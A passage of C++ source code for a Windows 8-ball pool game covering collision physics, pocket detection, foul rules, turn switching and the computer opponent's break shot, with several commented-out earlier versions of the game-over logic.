                const float leftBound = TABLE_LEFT + BALL_RADIUS;
                const float rightBound = TABLE_RIGHT - BALL_RADIUS;
                const float topBound = TABLE_TOP + BALL_RADIUS;
                const float bottomBound = TABLE_BOTTOM - BALL_RADIUS;

                if (b.x < leftBound) { b.x = leftBound;   b.vx = fabsf(b.vx); }
                if (b.x > rightBound) { b.x = rightBound;  b.vx = -fabsf(b.vx); }
                if (b.y < topBound) { b.y = topBound;    b.vy = fabsf(b.vy); }
                if (b.y > bottomBound) { b.y = bottomBound; b.vy = -fabsf(b.vy); }
            }
        }
    }

    void CheckCollisions() {
        float left = TABLE_LEFT;
        float right = TABLE_RIGHT;
        float top = TABLE_TOP;
        float bottom = TABLE_BOTTOM;
        const float pocketMouthCheckRadiusSq = (POCKET_RADIUS + BALL_RADIUS) * (POCKET_RADIUS + BALL_RADIUS) * 1.1f;

        // --- Reset Per-Frame Sound Flags ---
        bool playedWallSoundThisFrame = false;
        bool playedCollideSoundThisFrame = false;
        // ---

        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b1 = balls[i];
            if (b1.isPocketed) continue;

            bool nearPocket[6];
            for (int p = 0; p < 6; ++p) {
                nearPocket[p] = GetDistanceSq(b1.x, b1.y, pocketPositions[p].x, pocketPositions[p].y) < pocketMouthCheckRadiusSq;
            }
            bool nearTopLeftPocket = nearPocket[0];
            bool nearTopMidPocket = nearPocket[1];
            bool nearTopRightPocket = nearPocket[2];
            bool nearBottomLeftPocket = nearPocket[3];
            bool nearBottomMidPocket = nearPocket[4];
            bool nearBottomRightPocket = nearPocket[5];

            bool collidedWallThisBall = false;

            // --- Ball-Wall Collisions ---
            // (Check logic unchanged, added sound calls and railHitAfterContact update)
            // Left Wall
            if (b1.x - BALL_RADIUS < left) {
                if (!nearTopLeftPocket && !nearBottomLeftPocket) {
                    b1.x = left + BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Right Wall
            if (b1.x + BALL_RADIUS > right) {
                if (!nearTopRightPocket && !nearBottomRightPocket) {
                    b1.x = right - BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Top Wall
            if (b1.y - BALL_RADIUS < top) {
                if (!nearTopLeftPocket && !nearTopMidPocket && !nearTopRightPocket) {
                    b1.y = top + BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Bottom Wall
            if (b1.y + BALL_RADIUS > bottom) {
                if (!nearBottomLeftPocket && !nearBottomMidPocket && !nearBottomRightPocket) {
                    b1.y = bottom - BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }

            // Spin effect (Unchanged)
            if (collidedWallThisBall) {
                if (b1.x <= left + BALL_RADIUS || b1.x >= right - BALL_RADIUS) { b1.vy += cueSpinX * b1.vx * 0.05f; }
                if (b1.y <= top + BALL_RADIUS || b1.y >= bottom - BALL_RADIUS) { b1.vx -= cueSpinY * b1.vy * 0.05f; }
                cueSpinX *= 0.7f; cueSpinY *= 0.7f;
            }


            // --- Ball-Ball Collisions ---
            for (size_t j = i + 1; j < balls.size(); ++j) {
                Ball& b2 = balls[j];
                if (b2.isPocketed) continue;

                float dx = b2.x - b1.x; float dy = b2.y - b1.y;
                float distSq = dx * dx + dy * dy;
                float minDist = BALL_RADIUS * 2.0f;

                if (distSq > 1e-6 && distSq < minDist * minDist) {
                    float dist = sqrtf(distSq);
                    float overlap = minDist - dist;
                    float nx = dx / dist; float ny = dy / dist;

                    // Separation (Unchanged)
                    b1.x -= overlap * 0.5f * nx; b1.y -= overlap * 0.5f * ny;
                    b2.x += overlap * 0.5f * nx; b2.y += overlap * 0.5f * ny;

                    float rvx = b1.vx - b2.vx; float rvy = b1.vy - b2.vy;
                    float velAlongNormal = rvx * nx + rvy * ny;

                    if (velAlongNormal > 0) { // Colliding
                        // --- Play Ball Collision Sound ---
                        if (!playedCollideSoundThisFrame) {
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""poolballhit.wav"")).detach();
                            playedCollideSoundThisFrame = true; // Set flag
                        }
                        // --- End Sound ---

                        // --- NEW: Track First Hit and Cue/Object Collision ---
                        if (firstHitBallIdThisShot == -1) { // If first hit hasn't been recorded yet
                            if (b1.id == 0) { // Cue ball hit b2 first
                                firstHitBallIdThisShot = b2.id;
                                cueHitObjectBallThisShot = true;
                            }
                            else if (b2.id == 0) { // Cue ball hit b1 first
                                firstHitBallIdThisShot = b1.id;
                                cueHitObjectBallThisShot = true;
                            }
                            // If neither is cue ball, doesn't count as first hit for foul purposes
                        }
                        else if (b1.id == 0 || b2.id == 0) {
                            // Track subsequent cue ball collisions with object balls
                            cueHitObjectBallThisShot = true;
                        }
                        // --- End First Hit Tracking ---


                        // Impulse (Unchanged)
                        float impulse = velAlongNormal;
                        b1.vx -= impulse * nx; b1.vy -= impulse * ny;
                        b2.vx += impulse * nx; b2.vy += impulse * ny;

                        // Spin Transfer (Unchanged)
                        if (b1.id == 0 || b2.id == 0) {
                            float spinEffectFactor = 0.08f;
                            b1.vx += (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b1.vy += (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            b2.vx -= (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b2.vy -= (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            cueSpinX *= 0.85f; cueSpinY *= 0.85f;
                        }
                    }
                }
            } // End ball-ball loop
        } // End ball loop
    } // End CheckCollisions


    bool CheckPockets() {
        bool anyPocketed = false;
        // FIX: Declare a local flag to ensure the sound only plays ONCE per function call.
        bool ballPocketedThisCheck = false;
        // For each ball not already pocketed:
        for (auto& b : balls) {
            if (b.isPocketed)
                continue;

            // Check against each pocket
            for (int p = 0; p < 6; ++p) {
                float dx = b.x - pocketPositions[p].x;
                float dy = b.y - pocketPositions[p].y;
                if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                    // It's in the pocket—remove it from play
                    // If it's the 8?ball, remember which pocket it went into
                    if (b.id == 8) {
                        lastEightBallPocketIndex = p;   // <-- Must set here!
                    }
                    b.isPocketed = true;
                    b.vx = b.vy = 0.0f;           // kill any movement
                    pocketedThisTurn.push_back(b.id);
                    anyPocketed = true;

                    // --- FIX: Insert your sound logic here ---
                    // The 'if' guard prevents multiple sounds on a multi-ball break.
                    if (!ballPocketedThisCheck) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""pocket.wav"")).detach();
                        ballPocketedThisCheck = true;
                    }
                    // --- End Sound Fix ---

                    break;  // no need to check other pockets for this ball
                }
            }
        }
        return anyPocketed;
    }

    bool AreBallsMoving() {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (!balls[i].isPocketed && (balls[i].vx != 0 || balls[i].vy != 0)) {
                return true;
            }
        }
        return false;
    }

    void RespawnCueBall(bool behindHeadstring) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {
            // Determine the initial target position
            float targetX, targetY;
            if (behindHeadstring) {
                targetX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }
            else {
                targetX = TABLE_LEFT + TABLE_WIDTH / 2.0f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }

            // FOOLPROOF FIX: Check if the target spot is valid. If not, nudge it until it is.
            int attempts = 0;
            while (!IsValidCueBallPosition(targetX, targetY, behindHeadstring) && attempts < 100) {
                // If the spot is occupied, try nudging the ball slightly.
                targetX += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                targetY += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                // Clamp to stay within reasonable bounds
                targetX = std::max(TABLE_LEFT + BALL_RADIUS, std::min(targetX, TABLE_RIGHT - BALL_RADIUS));
                targetY = std::max(TABLE_TOP + BALL_RADIUS, std::min(targetY, TABLE_BOTTOM - BALL_RADIUS));
                attempts++;
            }

            // Set the final, valid position.
            cueBall->x = targetX;
            cueBall->y = targetY;
            cueBall->vx = 0;
            cueBall->vy = 0;
            cueBall->isPocketed = false;

            // Set the correct game state for ball-in-hand.
            if (currentPlayer == 1) {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else {
                currentGameState = BALL_IN_HAND_P2;
                if (isPlayer2AI) {
                    aiTurnPending = true;
                }
            }
        }
    }


    // --- Game Logic ---

    void ApplyShot(float power, float angle, float spinX, float spinY) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {

            // --- Play Cue Strike Sound (Threaded) ---
            if (power > 0.1f) { // Only play if it's an audible shot
                std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
            }
            // --- End Sound ---

            cueBall->vx = cosf(angle) * power;
            cueBall->vy = sinf(angle) * power;

            // Apply English (Spin) - Simplified effect (Unchanged)
            cueBall->vx += sinf(angle) * spinY * 0.5f;
            cueBall->vy -= cosf(angle) * spinY * 0.5f;
            cueBall->vx -= cosf(angle) * spinX * 0.5f;
            cueBall->vy -= sinf(angle) * spinX * 0.5f;

            // Store spin (Unchanged)
            cueSpinX = spinX;
            cueSpinY = spinY;

            // --- Reset Foul Tracking flags for the new shot ---
            // (Also reset in LBUTTONUP, but good to ensure here too)
            firstHitBallIdThisShot = -1;      // No ball hit yet
            cueHitObjectBallThisShot = false; // Cue hasn't hit anything yet
            railHitAfterContact = false;     // No rail hit after contact yet
            // --- End Reset ---

                    // If this was the opening break shot, clear the flag
            if (isOpeningBreakShot) {
                isOpeningBreakShot = false; // Mark opening break as taken
            }
        }
    }


    // ---------------------------------------------------------------------
    //  ProcessShotResults()
    // ---------------------------------------------------------------------
    void ProcessShotResults() {
        bool cueBallPocketed = false;
        bool eightBallPocketed = false;
        bool playerContinuesTurn = false;

        // --- Step 1: Update Ball Counts FIRST (THE CRITICAL FIX) ---
        // We must update the score before any other game logic runs.
        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        int ownBallsPocketedThisTurn = 0;

        for (int id : pocketedThisTurn) {
            Ball* b = GetBallById(id);
            if (!b) continue;

            if (b->id == 0) {
                cueBallPocketed = true;
            }
            else if (b->id == 8) {
                eightBallPocketed = true;
            }
            else {
                // This is a numbered ball. Update the pocketed count for the correct player.
                if (b->type == player1Info.assignedType && player1Info.assignedType != BallType::NONE) {
                    player1Info.ballsPocketedCount++;
                }
                else if (b->type == player2Info.assignedType && player2Info.assignedType != BallType::NONE) {
                    player2Info.ballsPocketedCount++;
                }

                if (b->type == shootingPlayer.assignedType) {
                    ownBallsPocketedThisTurn++;
                }
            }
        }

        if (ownBallsPocketedThisTurn > 0) {
            playerContinuesTurn = true;
        }

        // --- Step 2: Handle Game-Ending 8-Ball Shot ---
        // Now that the score is updated, this check will have the correct information.
        if (eightBallPocketed) {
            CheckGameOverConditions(true, cueBallPocketed);
            if (currentGameState == GAME_OVER) {
                pocketedThisTurn.clear();
                return;
            }
        }

        // --- Step 3: Check for Fouls ---
        bool turnFoul = false;
        if (cueBallPocketed) {
            turnFoul = true;
        }
        else {
            Ball* firstHit = GetBallById(firstHitBallIdThisShot);
            if (!firstHit) { // Rule: Hitting nothing is a foul.
                turnFoul = true;
            }
            else { // Rule: Hitting the wrong ball type is a foul.
                if (player1Info.assignedType != BallType::NONE) { // Colors are assigned.
                    // We check if the player WAS on the 8-ball BEFORE this shot.
                    bool wasOnEightBall = (shootingPlayer.assignedType != BallType::NONE && (shootingPlayer.ballsPocketedCount - ownBallsPocketedThisTurn) >= 7);
                    if (wasOnEightBall) {
                        if (firstHit->id != 8) turnFoul = true;
                    }
                    else {
                        if (firstHit->type != shootingPlayer.assignedType) turnFoul = true;
                    }
                }
            }
        } //reenable below disabled for debugging
        //if (!turnFoul && cueHitObjectBallThisShot && !railHitAfterContact && pocketedThisTurn.empty()) {
            //turnFoul = true;
        //}
        foulCommitted = turnFoul;

        // --- Step 4: Final State Transition ---
        if (foulCommitted) {
            SwitchTurns();
            RespawnCueBall(false);
        }
        else if (player1Info.assignedType == BallType::NONE && !pocketedThisTurn.empty() && !cueBallPocketed) {
            // Assign types on the break.
            for (int id : pocketedThisTurn) {
                Ball* b = GetBallById(id);
                if (b && b->type != BallType::EIGHT_BALL) {
                    AssignPlayerBallTypes(b->type);
                    break;
                }
            }
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else if (playerContinuesTurn) {
            // The player's turn continues. Now the check will work correctly.
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else {
            SwitchTurns();
        }

        pocketedThisTurn.clear();
    }

    /*
    // --- Step 3: Final State Transition ---
    if (foulCommitted) {
        SwitchTurns();
        RespawnCueBall(false);
    }
    else if (playerContinuesTurn) {
        CheckAndTransitionToPocketChoice(currentPlayer);
    }
    else {
        SwitchTurns();
    }

    pocketedThisTurn.clear();
    } */

    //  Assign groups AND optionally give the shooter his first count.
    bool AssignPlayerBallTypes(BallType firstPocketedType, bool creditShooter /*= true*/)
    {
        if (firstPocketedType != SOLID && firstPocketedType != STRIPE)
            return false;                                 // safety

        /* ---------------------------------------------------------
           1.  Decide the groups
        --------------------------------------------------------- */
        if (currentPlayer == 1)
        {
            player1Info.assignedType = firstPocketedType;
            player2Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }
        else
        {
            player2Info.assignedType = firstPocketedType;
            player1Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }

        /* ---------------------------------------------------------
           2.  Count the very ball that made the assignment
        --------------------------------------------------------- */
        if (creditShooter)
        {
            if (currentPlayer == 1)
                ++player1Info.ballsPocketedCount;
            else
                ++player2Info.ballsPocketedCount;
        }
        return true;
    }

    /*bool AssignPlayerBallTypes(BallType firstPocketedType) {
        if (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE) {
            if (currentPlayer == 1) {
                player1Info.assignedType = firstPocketedType;
                player2Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            else {
                player2Info.assignedType = firstPocketedType;
                player1Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            return true; // Assignment was successful
        }
        return false; // No assignment made (e.g., 8-ball was pocketed on break)
    }*/
    // If 8-ball was first (illegal on break generally), rules vary.
    // Here, we might ignore assignment until a solid/stripe is pocketed legally.
    // Or assign based on what *else* was pocketed, if anything.
    // Simplification: Assignment only happens on SOLID or STRIPE first pocket.


    // --- Called in ProcessShotResults() after pocket detection ---
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        // Only care if the 8?ball really went in:
        if (!eightBallPocketed) return;

        // Who’s shooting now?
        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        // Which pocket did we CALL?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did it ACTUALLY fall into?
        int actual = lastEightBallPocketIndex;

        // Check legality: must have called a pocket ?0, must match actual,
        // must have pocketed all 7 of your balls first, and must not have scratched.
        bool legal = (called >= 0)
            && (called == actual)
            && (shooter.ballsPocketedCount >= 7)
            && (!cueBallPocketed);

        // Build a message that shows both values for debugging/tracing:
        if (legal) {
            gameOverMessage = shooter.name
                + L"" Wins! ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name
                + L"" Wins! (Illegal 8-Ball) ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }



    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return;

        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponentPlayer = (currentPlayer == 1) ? player2Info : player1Info;

        // Handle 8-ball on break: re-spot and continue.
        if (player1Info.assignedType == BallType::NONE) {
            Ball* b = GetBallById(8);
            if (b) { b->isPocketed = false; b->x = RACK_POS_X; b->y = RACK_POS_Y; b->vx = b->vy = 0; }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // --- FOOLPROOF WIN/LOSS LOGIC ---
        bool wasOnEightBall = IsPlayerOnEightBall(currentPlayer);
        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = -1;

        // Find which pocket the 8-ball actually went into.
        for (int id : pocketedThisTurn) {
            if (id == 8) {
                Ball* b = GetBallById(8); // This ball is already marked as pocketed, but we need its last coords.
                if (b) {
                    for (int p_idx = 0; p_idx < 6; ++p_idx) {
                        // Check last known position against pocket centers
                        if (GetDistanceSq(b->x, b->y, pocketPositions[p_idx].x, pocketPositions[p_idx].y) < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                            actualPocket = p_idx;
                            break;
                        }
                    }
                }
                break;
            }
        }

        // Evaluate win/loss based on a clear hierarchy of rules.
        if (!wasOnEightBall) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball Pocketed Early)"";
        }
        else if (cueBallPocketed) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Scratched on 8-Ball)"";
        }
        else if (calledPocket == -1) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Pocket Not Called)"";
        }
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball in Wrong Pocket)"";
        }
        else {
            // WIN! All loss conditions failed, this must be a legal win.
            gameOverMessage = shootingPlayer.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    }*/

    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        // Which pocket did we call?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did the ball really fall into?
        int actual = lastEightBallPocketIndex;

        // Legal victory only if:
        //  1) Shooter had already pocketed 7 of their object balls,
        //  2) They called a pocket,
        //  3) The 8?ball actually fell into that same pocket,
        //  4) They did not scratch on the 8?ball.
        bool legal =
            (shooter.ballsPocketedCount >= 7) &&
            (called >= 0) &&
            (called == actual) &&
            (!cueBallPocketed);

        if (legal) {
            gameOverMessage = shooter.name + L"" Wins! ""
                L""(called: "" + std::to_wstring(called) +
                L"", actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name + L"" Wins! (illegal 8-ball) ""
            // For debugging you can append:
            + L"" (called: "" + std::to_wstring(called)
            + L"", actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    // ????????????????????????????????????????????????????????????????
    //  CheckGameOverConditions()
    //     – Called when the 8-ball has fallen.
    //     – Decides who wins and builds the gameOverMessage.
    // ????????????????????????????????????????????????????????????????
    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;                     // safety

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = lastEightBallPocketIndex;

        bool clearedSeven = (shooter.ballsPocketedCount >= 7);
        bool noScratch = !cueBallPocketed;
        bool callMade = (calledPocket >= 0);

        // helper ? turn “-1” into ""None"" for readability
        auto pocketToStr = [](int idx) -> std::wstring
        {
            return (idx >= 0) ? std::to_wstring(idx) : L""None"";
        };

        if (clearedSeven && noScratch && callMade && actualPocket == calledPocket)
        {
            // legitimate win
            gameOverMessage =
                shooter.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }
        else
        {
            // wrong pocket, scratch, or early 8-ball
            gameOverMessage =
                opponent.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    /* void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return; // Only when 8-ball actually pocketed

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        bool      onEightRoll = IsPlayerOnEightBall(currentPlayer);
        int       calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int       actualPocket = -1;
        Ball* bEight = GetBallById(8);

        // locate which hole the 8-ball went into
        if (bEight) {
            for (int i = 0; i < 6; ++i) {
                if (GetDistanceSq(bEight->x, bEight->y,
                    pocketPositions[i].x, pocketPositions[i].y)
                    < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                    actualPocket = i; break;
                }
            }
        }

        // 1) On break / pre-assignment: re-spot & continue
        if (player1Info.assignedType == BallType::NONE) {
            if (bEight) {
                bEight->isPocketed = false;
                bEight->x = RACK_POS_X; bEight->y = RACK_POS_Y;
                bEight->vx = bEight->vy = 0;
            }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // 2) Loss if pocketed 8 early
        if (!onEightRoll) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" pocketed 8-ball early)"";
        }
        // 3) Loss if scratched
        else if (cueBallPocketed) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" scratched on 8-ball)"";
        }
        // 4) Loss if no pocket call
        else if (calledPocket < 0) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" did not call a pocket)"";
        }
        // 5) Loss if in wrong pocket
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponent.name + L"" Wins! ("" + shooter.name + L"" 8-ball in wrong pocket)"";
        }
        // 6) Otherwise, valid win
        else {
            gameOverMessage = shooter.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    } */


    // Switch the shooter, handle fouls and decide what state we go to next.
    // ────────────────────────────────────────────────────────────────
    //  SwitchTurns – final version (arrow–leak bug fixed)
    // ────────────────────────────────────────────────────────────────
    void SwitchTurns()
    {
        /* --------------------------------------------------------- */
        /* 1.  Hand the table over to the other player               */
        /* --------------------------------------------------------- */
        currentPlayer = (currentPlayer == 1) ? 2 : 1;

        /* --------------------------------------------------------- */
        /* 2.  Generic per–turn resets                               */
        /* --------------------------------------------------------- */
        isAiming = false;
        shotPower = 0.0f;
        currentlyHoveredPocket = -1;

        /* --------------------------------------------------------- */
        /* 3.  Wipe every previous pocket call                       */
        /*    (the new shooter will choose again if needed)          */
        /* --------------------------------------------------------- */
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage.clear();

        /* --------------------------------------------------------- */
        /* 4.  Handle fouls — cue-ball in hand overrides everything  */
        /* --------------------------------------------------------- */
        if (foulCommitted)
        {
            if (currentPlayer == 1)            // human
            {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else                               // P2
            {
                currentGameState = BALL_IN_HAND_P2;
                aiTurnPending = isPlayer2AI;   // AI will place cue-ball
            }

            foulCommitted = false;
            return;                            // we're done for this frame
        }

        /* --------------------------------------------------------- */
        /* 5.  Normal flow                                           */
        /*    Will put us in  ∘ PLAYER?_TURN                         */
        /*                    ∘ CHOOSING_POCKET_P?                   */
        /*                    ∘ AI_THINKING  (for CPU)               */
        /* --------------------------------------------------------- */
        CheckAndTransitionToPocketChoice(currentPlayer);
    }


    void AIBreakShot() {
        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        // This function is called when it's AI's turn for the opening break and state is PRE_BREAK_PLACEMENT.
        // AI will place the cue ball and then plan the shot.
        if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
            // Place cue ball in the kitchen randomly
            /*float kitchenMinX = TABLE_LEFT + BALL_RADIUS; // [cite: 1071, 1072, 1587]
            float kitchenMaxX = HEADSTRING_X - BALL_RADIUS; // [cite: 1072, 1078, 1588]
            float kitchenMinY = TABLE_TOP + BALL_RADIUS; // [cite: 1071, 1072, 1588]
            float kitchenMaxY = TABLE_BOTTOM - BALL_RADIUS; // [cite: 1072, 1073, 1589]*/

            // --- AI Places Cue Ball for Break ---
    // Decide if placing center or side. For simplicity, let's try placing slightly off-center
    // towards one side for a more angled break, or center for direct apex hit.
    // A common strategy is to hit the second ball of the rack.

            float placementY = RACK_POS_Y; // Align vertically with the rack center
            float placementX;

            // Randomly choose a side or center-ish placement for variation.
            int placementChoice = rand() % 3; // 0: Left-ish, 1: Center-ish, 2: Right-ish in kitchen

            if (placementChoice == 0) { // Left-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) - (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the left within kitchen
            }
            else if (placementChoice == 2) { // Right-ish
                placementX = HEADSTRING_X - (TABLE_WIDTH * 0.05f) + (BALL_RADIUS * (1 + (rand() % 3))); // Place slightly to the right within kitchen
            }
            else { // Center-ish
                placementX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // Roughly center of kitchen
            }
            placementX = std::max(TABLE_LEFT + BALL_RADIUS + 1.0f, std::min(placementX, HEADSTRING_X - BALL_RADIUS - 1.0f)); // Clamp within kitchen X

            bool validPos = false;
            int attempts = 0;
            while (!validPos && attempts < 100) {
                /*cueBall->x = kitchenMinX + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxX - kitchenMinX)); // [cite: 1589]
                cueBall->y = kitchenMinY + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX) / (kitchenMaxY - kitchenMinY)); // [cite: 1590]
                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1591]
                    validPos = true; // [cite: 1591]*/
                    // Try the chosen X, but vary Y slightly to find a clear spot
                cueBall->x = placementX;
                cueBall->y = placementY + (static_cast<float>(rand() % 100 - 50) / 100.0f) * BALL_RADIUS * 2.0f; // Vary Y a bit
                cueBall->y = std::max(TABLE_TOP + BALL_RADIUS + 1.0f, std::min(cueBall->y, TABLE_BOTTOM - BALL_RADIUS - 1.0f)); // Clamp Y

                if (IsValidCueBallPosition(cueBall->x, cueBall->y, true /* behind headstring */)) {
                    validPos = true;
                }
                attempts++; // [cite: 1592]
            }
            if (!validPos) {
                // Fallback position
                /*cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f; // [cite: 1071, 1078, 1593]
                cueBall->y = (TABLE_TOP + TABLE_BOTTOM) * 0.5f; // [cite: 1071, 1073, 1594]
                if (!IsValidCueBallPosition(cueBall->x, cueBall->y, true)) { // [cite: 1594]
                    cueBall->x = HEADSTRING_X - BALL_RADIUS * 2; // [cite: 1072, 1078, 1594]
                    cueBall->y = RACK_POS_Y; // [cite: 1080, 1595]
                }
            }
            cueBall->vx = 0; // [cite: 1595]
            cueBall->vy = 0; // [cite: 1596]

            // Plan a break shot: aim at the center of the rack (apex ball)
            float targetX = RACK_POS_X; // [cite: 1079] Aim for the apex ball X-coordinate
            float targetY = RACK_POS_Y; // [cite: 1080] Aim for the apex ball Y-coordinate

            float dx = targetX - cueBall->x; // [cite: 1599]
            float dy = targetY - cueBall->y; // [cite: 1600]
            float shotAngle = atan2f(dy, dx); // [cite: 1600]
            float shotPowerValue = MAX_SHOT_POWER; // [cite: 1076, 1600] Use MAX_SHOT_POWER*/

                cueBall->x = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.75f; // A default safe spot in kitchen
                cueBall->y = RACK_POS_Y;
            }
            cueBall->vx = 0; cueBall->vy = 0;

            // --- AI Plans the Break Shot ---
            float targetX, targetY;
            // If cue ball is near center of kitchen width, aim for apex.
            // Otherwise, aim for the second ball on the side the cue ball is on (for a cut break).
            float kitchenCenterRegion = (HEADSTRING_X - TABLE_LEFT) * 0.3f; // Define a ""center"" region
            if (std::abs(cueBall->x - (TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) / 2.0f)) < kitchenCenterRegion / 2.0f) {
